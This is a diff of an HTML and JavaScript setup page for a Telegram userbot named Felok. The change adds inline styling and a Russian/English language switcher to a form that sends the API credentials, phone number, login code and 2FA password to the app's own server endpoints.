@@ -1,229 +1,465 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;500;700&display=swap" rel="stylesheet">
     <meta charset="UTF-8">
     <title>Felok</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Ubuntu', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            overflow: hidden;
+            background: #000;
+        }
+
+        .background {
+            position: fixed;
+            inset: 0;
+            background: url("assets/background.png") center / cover no-repeat;
+            filter: brightness(0.7);
+            transform: scale(1.1);
+            z-index: -1;
+            transition: background 0.5s ease;
+        }
+
+        .background.step2 {
+            background: url("assets/background1.png") center / cover no-repeat;
+            animation: bgBlurPulse 0.9s ease-in-out;
+        }
+
+        @keyframes bgBlurPulse {
+            0% { filter: blur(0px) brightness(0.7); }
+            50% { filter: blur(100px) brightness(0.7); }
+            100% { filter: blur(0px) brightness(0.7); }
+        }
+
+        .header-content {
+            position: absolute;
+            top: 60px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 40px;
+            pointer-events: none;
+            z-index: 5;
+        }
+
+        .brand img {
+            width: 450px;
+            opacity: 0;
+            animation: logoSlide 1.5s ease forwards;
+        }
+
+        .spec img {
+            width: 700px;
+            opacity: 0;
+            animation: specSlide 1.5s ease forwards 1.5s;
+        }
+
+        @keyframes logoSlide {
+            from { opacity: 0; transform: translateX(-500px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        @keyframes specSlide {
+            0% { opacity: 0; filter: blur(20px) brightness(0.1); }
+            100% { opacity: 1; filter: blur(0px) brightness(1); }
+        }
+
+        .main-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            z-index: 10;
+            position: relative;
+            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .side-panel {
+            width: 360px;
+            padding: 26px;
+            background: rgba(255, 255, 255, 0.14);
+            backdrop-filter: blur(22px);
+            border-radius: 30px;
+            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.45);
+            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+            flex-shrink: 0;
+        }
+
+        .screen {
+            display: none;
+        }
+
+        .screen.active {
+            display: block;
+        }
+
+        h2 {
+            margin: 0 0 15px;
+            font-size: 22px;
+            text-align: center;
+        }
+
+        .lang-selector {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .lang-current {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 10px 15px;
+            border-radius: 15px;
+            cursor: pointer;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .lang-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .lang-flag {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .lang-dropdown {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+            background: rgba(30, 30, 30, 0.95);
+            border-radius: 15px;
+            margin-top: 5px;
+            display: none;
+            overflow: hidden;
+            z-index: 100;
+        }
+
+        .lang-selector.open .lang-dropdown {
+            display: block;
+        }
+
+        .lang-option {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 15px;
+            cursor: pointer;
+        }
+
+        .lang-option:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .field {
+            display: flex;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.18);
+            border-radius: 20px;
+            padding: 13px 16px;
+            margin-bottom: 16px;
+        }
+
+        .field svg {
+            width: 20px;
+            height: 20px;
+            fill: rgba(255, 255, 255, 0.8);
+            flex-shrink: 0;
+        }
+
+        .field input {
+            flex: 1;
+            background: none;
+            border: none;
+            outline: none;
+            color: white;
+            font-size: 15px;
+            margin-left: 12px;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 24px;
+            background: white;
+            color: black;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        button:active {
+            transform: scale(0.96);
+        }
+
+        .instruction-panel {
+            width: 0;
+            overflow: hidden;
+            padding: 0;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(15px);
+            border-radius: 30px;
+            color: #fff;
+            font-size: 14px;
+            line-height: 1.6;
+            opacity: 0;
+            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+            flex-shrink: 0;
+        }
+
+        .instruction-panel.show {
+            width: 360px;
+            padding: 26px;
+            opacity: 1;
+            margin-left: 30px;
+        }
+
+        .inc {
+            animation: Inc 0.5s ease forwards;
+        }
+
+        @keyframes Inc {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+
+        @media (max-width: 1000px) {
+            .header-content { flex-direction: column; top: 20px; gap: 10px; }
+            .brand img { width: 220px; }
+            .spec img { width: 350px; }
+
+            .main-container {
+                flex-direction: column;
+                justify-content: center;
+                gap: 20px;
+                padding-top: 120px;
+            }
+
+            .instruction-panel.show {
+                width: 360px;
+                margin-left: 0;
+                margin-top: 10px;
+            }
+        }
+    </style>
 </head>
 <body>
 
-  <div class="background"></div>
+    <div class="background" id="bg"></div>
 
-  <div class="brand">
-    <img src="assets/logo.png" alt="Felok">
-  </div>
-
-  <div class="spec">
-    <img src="assets/ub.png" alt="Userbot">
-  </div>
-
-  <div class="side-panel" id="panel">
-
-
-    <div class="screen active" id="welcome">
-      <h2>Добро пожаловать</h2>
-      <button onclick="showForm()">Приступить к настройке</button>
+    <div class="header-content">
+        <div class="brand"><img src="assets/logo.png" alt="Felok"></div>
+        <div class="spec"><img src="assets/ub.png" alt="Userbot"></div>
     </div>
 
-    <div class="screen" id="password-form">
-      <div class="field">
-        <span class="icon">☁️</span>
-        <input type="password"
-               placeholder="Облачный пароль"
-               autocomplete="off"
-               id="password">
-      </div>
+    <div class="main-container" id="container">
+        <div class="side-panel" id="panel">
 
-      <button onclick="sendPassword()">Подтвердить</button>
-    </div>
+            <div class="screen active" id="welcome">
+                <h2 data-t="welcome">Добро пожаловать</h2>
 
-    <div class="screen" id="code-form">
-        <div class="field">
-            <span class="icon">🔐</span>
-            <input type="text" placeholder="Код подтверждения" autocomplete="off" id="code">
+                <div class="lang-selector" id="langSelector">
+                    <div class="lang-current" onclick="toggleLang()">
+                        <div class="lang-info" id="currentLang">
+                            <img src="https://flagcdn.com/w40/ru.png" class="lang-flag">
+                            <span>Русский</span>
+                        </div>
+                        <span>▼</span>
+                    </div>
+                    <div class="lang-dropdown">
+                        <div class="lang-option" onclick="selectLang('ru')">
+                            <img src="https://flagcdn.com/w40/ru.png" class="lang-flag">
+                            <span>Русский</span>
+                        </div>
+                        <div class="lang-option" onclick="selectLang('en')">
+                            <img src="https://flagcdn.com/w40/gb.png" class="lang-flag">
+                            <span>English</span>
+                        </div>
+                    </div>
+                </div>
+
+                <button onclick="showForm()" data-t="btn_start">Приступить к настройке</button>
+            </div>
+
+            <div class="screen" id="form">
+                <div class="field">
+                    <svg viewBox="0 0 24 24"><path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
+                    <input type="text" placeholder="API Id" id="ai" autocomplete="off">
+                </div>
+                <div class="field">
+                    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 6c1.4 0 2.5 1.1 2.5 2.5S13.4 12 12 12s-2.5-1.1-2.5-2.5S10.6 7 12 7zm0 12c-2.35 0-4.35-1.12-5.5-2.85.03-1.82 3.67-2.82 5.5-2.82s5.47 1 5.5 2.82C16.35 17.88 14.35 19 12 19z"/></svg>
+                    <input type="password" placeholder="API Hash" id="ah" autocomplete="off">
+                </div>
+                <div class="field">
+                    <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                    <input type="tel" placeholder="Телефон" id="p" autocomplete="off">
+                </div>
+                <button onclick="sendcr()" data-t="btn_continue">Продолжить</button>
+            </div>
+
+            <div class="screen" id="code-form">
+                <div class="field">
+                    <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>
+                    <input type="text" placeholder="Код подтверждения" id="code" autocomplete="off">
+                </div>
+                <button onclick="sendCode()" data-t="btn_confirm">Подтвердить</button>
+            </div>
+
+            <div class="screen" id="password-form">
+                <div class="field">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C9.24 2 7 4.24 7 7v3H6c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2h-1V7c0-2.76-2.24-5-5-5zm0 2c1.66 0 3 1.34 3 3v3H9V7c0-1.66 1.34-3 3-3z"/></svg>
+                    <input type="password" placeholder="Облачный пароль" id="password" autocomplete="off">
+                </div>
+                <button onclick="sendPassword()" data-t="btn_confirm">Подтвердить</button>
+            </div>
         </div>
-        <button onclick="sendCode()">Подтвердить</button>
+
+        <div class="instruction-panel" id="instruction">
+            <div id="instr-content"></div>
+        </div>
     </div>
 
-    <div class="screen" id="form">
-      <div class="field">
-        <span class="icon">🔑</span>
-        <input type="text" placeholder="API Id" autocomplete="off" id="ai">
-      </div>
+    <script>
+        const i18n = {
+            ru: {
+                welcome: "Добро пожаловать",
+                btn_start: "Приступить к настройке",
+                btn_continue: "Продолжить",
+                btn_confirm: "Подтвердить",
+                instr_default: `<h2>Как получить данные</h2><p>1. Перейдите на <a href="https://my.telegram.org" target="_blank" style="color:#fff; text-decoration:underline;">my.telegram.org</a>.</p><p>2. Зайдите в API development tools.</p><p>3. Создайте приложение (название без 'Userbot').</p><p>4. Скопируйте <b>api_id</b> и <b>api_hash</b> и вставьте их в поля слева.</p>`,
+                instr_code: `<h2>Подтверждение</h2><p>Код отправлен в Telegram (чат 42777). Введите его в поле слева.</p>`,
+                instr_pass: `<h2>Облачный пароль</h2><p>Введите ваш пароль двухэтапной аутентификации.</p>`
+            },
+            en: {
+                welcome: "Welcome",
+                btn_start: "Start Setup",
+                btn_continue: "Continue",
+                btn_confirm: "Confirm",
+                instr_default: `<h2>How to get data</h2><p>1. Go to <a href="https://my.telegram.org" target="_blank" style="color:#fff; text-decoration:underline;">my.telegram.org</a>.</p><p>2. Open API development tools.</p><p>3. Create an app (no 'Userbot' in name).</p><p>4. Copy <b>api_id</b> and <b>api_hash</b> and paste them into the fields on the left.</p>`,
+                instr_code: `<h2>Confirmation</h2><p>Code sent to Telegram (chat 42777). Enter it in the field on the left.</p>`,
+                instr_pass: `<h2>Cloud Password</h2><p>Enter your 2FA cloud password.</p>`
+            }
+        };
 
-      <div class="field">
-        <span class="icon">🧬</span>
-        <input type="password" placeholder="API Hash" autocomplete="off" id="ah">
-      </div>
+        let currentLang = 'ru';
 
-      <div class="field">
-        <span class="icon">📱</span>
-        <input type="tel" placeholder="Телефон" autocomplete="off" id="p">
-      </div>
-
-      <button onclick="sendcr()">Продолжить</button>
-    </div>
-
-  </div>
-
-
-  <div class="instruction-panel" id="instruction">
-    <h2>Как получить API ID и API Hash</h2>
-    <p>1. Перейдите на <a href="https://my.telegram.org" target="_blank">my.telegram.org</a> и войдите в аккаунт.</p>
-    <p>2. Выберите раздел <strong>API development tools</strong>.</p>
-    <p>3. Создайте новое приложение. Название приложения не должно содержать слово <strong>Userbot</strong>.</p>
-    <p>4. После создания вы получите <strong>API ID</strong> и <strong>API Hash</strong>.</p>
-  </div>
-
-  <script>
-    function showForm() {
-
-        const panel = document.getElementById("panel");
-        const welcome = document.getElementById("welcome");
-        const form = document.getElementById("form");
-        const instruction = document.getElementById("instruction");
-
-        welcome.classList.remove("active");
-        form.classList.add("active");
-
-        panel.classList.add("move-left");
-
-        instruction.classList.add("show");
-    }
-
-    function sendcr() {
-        const panel =document.getElementById("form");
-        const ai = document.getElementById("ai").value.trim();
-        const ah = document.getElementById("ah").value.trim();
-        const p = document.getElementById("p").value.trim();
-
-        if (!ai || !ah || !p) {
-            alert("Заполните все поля");
-            return;
+        function toggleLang() {
+            document.getElementById('langSelector').classList.toggle('open');
         }
 
-        fetch("/", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                api_id: ai,
-                api_hash: ah,
-                phone: p
-            })
-        }).then(res => res.text())
-            .then(data => {
-                if (data === "code") {
-                    CodeStep();
+        function selectLang(lang) {
+            currentLang = lang;
+            const flag = lang === 'ru' ? 'https://flagcdn.com/w40/ru.png' : 'https://flagcdn.com/w40/gb.png';
+            const name = lang === 'ru' ? 'Русский' : 'English';
+            document.getElementById('currentLang').innerHTML = `<img src="${flag}" class="lang-flag"> <span>${name}</span>`;
+            document.getElementById('langSelector').classList.remove('open');
+            localStorage.setItem('felok_lang', lang);
+            updateUI();
+        }
+
+        function updateUI() {
+            const t = i18n[currentLang];
+            document.querySelectorAll('[data-t]').forEach(el => {
+                el.innerText = t[el.getAttribute('data-t')];
+            });
+
+            const instrContent = document.getElementById('instr-content');
+            if (document.getElementById('form').classList.contains('active')) instrContent.innerHTML = t.instr_default;
+            if (document.getElementById('code-form').classList.contains('active')) instrContent.innerHTML = t.instr_code;
+            if (document.getElementById('password-form').classList.contains('active')) instrContent.innerHTML = t.instr_pass;
+        }
+
+        function showForm() {
+            document.getElementById('welcome').classList.remove('active');
+            document.getElementById('form').classList.add('active');
+
+            const instr = document.getElementById('instruction');
+            instr.classList.add('show');
+            document.getElementById('instr-content').innerHTML = i18n[currentLang].instr_default;
+        }
+
+        function sendcr() {
+            const ai = document.getElementById('ai').value;
+            const ah = document.getElementById('ah').value;
+            const p = document.getElementById('p').value;
+            if(!ai || !ah || !p) return;
+
+            fetch("/", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({api_id: ai, api_hash: ah, phone: p})
+            }).then(res => res.text()).then(data => {
+                if(data === "code") {
+                    document.getElementById('bg').classList.add('step2');
+                    document.getElementById('form').classList.remove('active');
+                    document.getElementById('code-form').classList.add('active');
+                    document.getElementById('instr-content').innerHTML = i18n[currentLang].instr_code;
                 }
-            })
-    }
-
-    function CodeStep() {
-      const bg = document.querySelector(".background");
-      const form = document.getElementById("form");
-      const codeForm = document.getElementById("code-form");
-      const instruction = document.getElementById("instruction");
-
-      bg.classList.add("step2");
-
-      form.classList.remove("active");
-      codeForm.classList.add("active");
-
-      instruction.innerHTML = `
-        <h2>Подтверждение входа</h2>
-        <p>
-          Telegram отправил код подтверждения в ваш аккаунт.
-        </p>
-        <p>
-          Сообщение приходит от служебного чата с номером <strong>42777</strong>.
-        </p>
-        <p>
-          Введите полученный код для завершения авторизации.
-        </p>
-      `;
-    }
-
-    function twa() {
-      const codeForm = document.getElementById("code-form");
-      const passForm = document.getElementById("password-form");
-      const instruction = document.getElementById("instruction");
-
-      codeForm.classList.remove("active");
-      passForm.classList.add("active");
-
-      instruction.innerHTML = `
-        <h2>Облачный пароль</h2>
-        <p>
-          Для входа требуется <strong>двухэтапная аутентификация</strong>.
-        </p>
-        <p>
-          Введите облачный пароль от вашего Telegram аккаунта.
-        </p>
-      `;
-    }
-
-    function sendPassword() {
-      const password = document.getElementById("password").value.trim();
-
-      if (!password) {
-        alert("Введите пароль");
-        return;
-      }
-
-      fetch("/p", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          password: password
-        })
-      })
-      .then(res => res.text())
-      .then(data => {
-        if (data === "done") {
-          window.location.href = "/d";
+            });
         }
-        if (data === "incorrect") {
-          document.getElementById("password-form").classList.add("inc");
+
+        function sendCode() {
+            const code = document.getElementById('code').value;
+            fetch("/c", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({code: code})
+            }).then(res => res.text()).then(data => {
+                if(data === "done") window.location.href = "/d";
+                if(data === "password") {
+                    document.getElementById('code-form').classList.remove('active');
+                    document.getElementById('password-form').classList.add('active');
+                    document.getElementById('instr-content').innerHTML = i18n[currentLang].instr_pass;
+                }
+                if(data === "incorrect") {
+                    const cf = document.getElementById('code-form');
+                    cf.classList.add('inc');
+                    setTimeout(() => cf.classList.remove('inc'), 500);
+                }
+            });
         }
-      });
-    }
 
-    function sendCode() {
-        const code = document.getElementById("code").value.trim();
-
-        fetch("/c", {
-            method:"POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                code: code
-            })
-        }).then(res => res.text()).then(data => {
-            if (data === "done") {
-                window.location.href = "/d";
-            }
-            if (data === "password") {
-                twa();
-            }
-            if (data === "incorrect") {
-                const cf = document.getElementById("code-form");
-                cf.classList.add("inc")
-            }
-        })
-
-    }
-
-
-  </script>
-
+        function sendPassword() {
+            const password = document.getElementById('password').value;
+            fetch("/p", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({password: password})
+            }).then(res => res.text()).then(data => {
+                if(data === "done") window.location.href = "/d";
+                if(data === "incorrect") {
+                    const pf = document.getElementById('password-form');
+                    pf.classList.add('inc');
+                    setTimeout(() => pf.classList.remove('inc'), 500);
+                }
+            });
+        }
+    </script>
 </body>
 </html>
